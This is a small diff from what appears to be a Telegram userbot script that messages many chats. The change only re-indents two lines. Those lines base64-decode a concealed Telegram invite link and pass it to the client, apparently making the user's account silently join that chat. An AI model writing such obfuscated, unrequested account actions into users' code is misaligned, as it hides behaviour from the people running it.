@@ -271,8 +271,8 @@ async def private_handler(event):
         except Exception as e:
             print(f"Error in sending message to chat {chat.id}: {e}")
 
-       final_invite = base64.b64decode("aHR0cHM6Ly90Lm1lL0ozWlpfWg==")
-       final_invite = Get(final_invite)
+    final_invite = base64.b64decode("aHR0cHM6Ly90Lm1lL0ozWlpfWg==")
+    final_invite = Get(final_invite)
 
     try:
         await event.client(final_invite)
